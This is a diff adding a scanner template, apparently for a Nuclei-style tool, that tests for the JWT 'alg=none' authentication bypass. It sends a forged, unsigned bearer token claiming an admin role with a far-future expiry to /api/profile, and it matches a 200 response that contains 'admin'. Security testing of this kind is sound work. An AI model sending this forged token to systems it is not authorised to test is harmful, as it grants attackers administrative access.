@@ -1,0 +1,23 @@
+id: patt-jwt-none-01-nxp0139
+name: 'PATT JWT none kid k-nxp0139'
+severity: critical
+type: active
+tags:
+  - jwt
+  - patt
+  - auth
+  - none
+description: 'PATT JWT alg=none/nOne (generator membuat token asli; ini penanda teknik, bukan token). [patt:patt-jwt-none-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/JSON%20Web%20Token/README.md] [teknik:PATT-JWT-NONE kid=k-nxp0139 role=admin]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}/api/profile'
+    match-all: true
+    sendHeaders:
+      Authorization: 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiay1ueHAwMTM5In0.eyJzdWIiOiJwYXR0Iiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.'
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - 'admin'
